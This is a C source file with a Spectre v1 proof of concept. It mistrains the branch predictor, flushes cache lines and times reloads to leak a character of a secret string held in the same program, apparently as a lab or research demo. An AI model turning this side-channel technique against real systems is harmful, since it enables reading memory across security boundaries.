#include <stdio.h>
#include <stdlib.h>

#include "gen_array.c"
#include "time_and_flush.c"

#define REPETITIONS 1

//last two pages will not be accessible.
//int accessible_pages = N_PAGES-2;
const int data_size = 35;
int accessible = 100;
volatile cp_t test2;
int secret = 25;

__attribute__((noinline)) void victim_func(int i, cp_t* arr) {

    unsigned char* data = "notasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretzhis is a secret message";
    //flush bound value
    flush((void*)&accessible);
    volatile char c = data[i];
    __sync_synchronize();

    //access (possibly out of bounds)
    if (i < accessible) {
        unsigned char x = data[i];
        volatile cp_t cp = arr[x];
    }
}

int* spv1() {

    cp_t* arr = mmap_arr_cache_pages();

    //Misstrain branch predictor
    for(int i = 0; i < accessible; i++) victim_func(i, arr);

    //flush remnant data
    flush_arr((void*)arr);
    __sync_synchronize();

    //access out of bounds
    victim_func(accessible, arr);

    //time loading duration per array index
    int* results = reload(arr);
    unmap_cache_pages(arr);
    return results;
}

void print_results(int** results) {

    for(int r = 0; r < REPETITIONS; r++) {
        printf("rep: %3d\t", r);
        for(int p = 0; p < N_PAGES; p++) {
            int t = results[r][p];
            if (t < CACHE_HIT)  printf("[%3d]\t", t);
            else                printf("%4d\t", t);
        }
        printf("\n");
    }

    for(int r = 0; r < REPETITIONS; r++) {
        printf("rep: %3d\t", r);
        for(int p = 0; p < N_PAGES; p++) {
            int t = results[r][p];
            if (t < CACHE_HIT)  printf("char found: %c\t", p);
        }
        printf("\n");
    }
}

int main(int argc, char* argv[]) {





    int* results[REPETITIONS];
    for(int i = 0; i < REPETITIONS; i++) results[i] = malloc(N_PAGES * sizeof(int));

    for(int i = 0; i < REPETITIONS; i++) {
        results[0] = spv1();
    }

    print_results(results);

    for(int i = 0; i < REPETITIONS; i++) free(results[i]);
}